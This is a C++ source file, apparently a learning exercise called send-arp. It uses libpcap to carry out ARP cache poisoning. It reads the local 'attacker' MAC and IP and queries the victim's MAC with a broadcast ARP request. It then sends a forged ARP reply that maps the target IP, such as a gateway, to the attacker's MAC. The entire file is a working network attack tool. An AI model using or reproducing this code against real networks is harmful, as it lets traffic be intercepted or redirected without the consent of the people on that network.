#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <libnet.h>
#include <net/if_arp.h>
#include <net/if.h>

#pragma pack(push, 1)
#define MAC_ALEN 6
#define IP_LEN 4

Mac get_attacker_mac(char* interface);
Ip get_attacker_ip(char* interface);
void print_ip(u_int32_t ip);
Mac get_sender_mac(pcap_t* handle,u_int8_t* attacker_mac,std::string attacker_ip,std::string sender_ip);
void send_arp(pcap_t* handle,u_int8_t* sender_mac,u_int8_t* attacker_mac,std::string sender_ip,std::string target_ip);

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}
struct EthArpPacket* check_header;

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
        printf("%d",argc);
		return -1;
	}

	char* dev = argv[1];
    std::string sender_ip = argv[2];
    std::string target_ip = argv[3];
	char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);


	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }
    //check attacker's mac address
    u_int8_t* attacker_mac;
    attacker_mac = get_attacker_mac(dev).operator uint8_t*();
    for(int i = 0; i < MAC_ALEN; i++)
        printf("%x",*(attacker_mac+i));
    std::string attacker_ip;
    attacker_ip = get_attacker_ip(dev).operator std::string();
    print_ip(get_attacker_ip(dev).operator uint32_t());


    u_int8_t* sender_mac;
    sender_mac = get_sender_mac(handle, attacker_mac, attacker_ip, sender_ip).operator uint8_t*();

    for(int i = 0; i < MAC_ALEN; i++)
        printf("%x",*(sender_mac+i));

    send_arp(handle,sender_mac,attacker_mac,sender_ip,target_ip);





    pcap_close(handle);


}

//googling
Mac get_attacker_mac(char* interface)
{
    struct ifreq ifr;
    int sockfd, ret;
    u_int8_t mac_addr[MAC_ALEN]= {0};

    sockfd = socket(AF_INET, SOCK_DGRAM,0);
    if(sockfd < 0)
    {
        printf("Fail to get interface MAC address");
    }
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR , &ifr);

    if(ret < 0)
    {
        printf("Fail to get interface MAC address - ioxtl(SIOCSIFHWADDR) failed");
        close(sockfd);
    }
    close(sockfd);
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);
    return Mac(mac_addr);

}

Ip get_attacker_ip(char* interface)
{
    struct ifreq ifr;
    char ipstr[40];
    int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
    { printf("Error"); }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
    return Ip(ipstr);

}
void print_ip(u_int32_t ip)
{
    printf("%d. %d. %d .%d\n", (ip&0xff000000)>>24,(ip&0xff0000)>>16,(ip&0xff00)>>8,(ip&0xff));
}




Mac get_sender_mac(pcap_t* handle,u_int8_t* attacker_mac,std::string attacker_ip,std::string sender_ip)
{
        //send request
        EthArpPacket packet;
        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.smac_ = Mac(attacker_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(attacker_mac);
        packet.arp_.sip_ = htonl(Ip(attacker_ip));
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        packet.arp_.tip_ = htonl(Ip(sender_ip));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        while (true)
        {
            struct pcap_pkthdr* header;
            const u_char* packet_data = 0;
            int res = pcap_next_ex(handle, &header, &packet_data);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }
            check_header = (struct EthArpPacket *)(packet_data);
            if(check_header->eth_.type()==0x0806 )
            {
                break;
            }
         }

        return Mac(check_header->arp_.smac());

}

void send_arp(pcap_t* handle,u_int8_t* sender_mac,u_int8_t* attacker_mac,std::string sender_ip,std::string target_ip)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(sender_mac);
    packet.eth_.smac_ = Mac(attacker_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(attacker_mac);
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = Mac(sender_mac);
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

}

